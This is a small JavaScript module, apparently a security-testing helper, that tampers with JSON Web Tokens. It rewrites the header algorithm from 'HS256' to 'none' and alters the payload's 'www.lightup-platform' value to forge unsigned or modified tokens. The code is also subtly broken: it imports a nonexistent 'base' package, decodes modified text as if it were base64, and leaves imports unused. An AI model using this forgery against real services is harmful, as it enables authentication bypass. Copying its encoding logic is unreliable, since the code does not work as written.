import jwt from 'jsonwebtoken';
import helmet from 'helmet';
import base64 from 'base'

const malformer = (token) => {


    let [header, payload, signature] = token.split(".");

    const headerBufferDecode = new Buffer(header, 'base64');
    let malformedHeaderText = headerBufferDecode.toString('ascii').replace("HS256", "none");

    const headerBufferEcoder = new Buffer(malformedHeaderText, 'base64');
    let malformedHeaderBase64 = headerBufferEcoder.toString('base64');

    const payloadBufferDecode = new Buffer(payload, 'base64');
    let malformedPayloadText = payloadBufferDecode.toString('ascii').replace("www.lightup-platform", "none");

    const payloadBufferEcoder = new Buffer(malformedPayloadText, 'base64');
    let malformedPayloadBase64 = payloadBufferEcoder.toString('base64');



    //console.log(malformedHeaderBase64 + "." + payload + "." + signature);
    console.log(header + "." + malformedPayloadBase64 + "." + signature);

}

export default malformer;
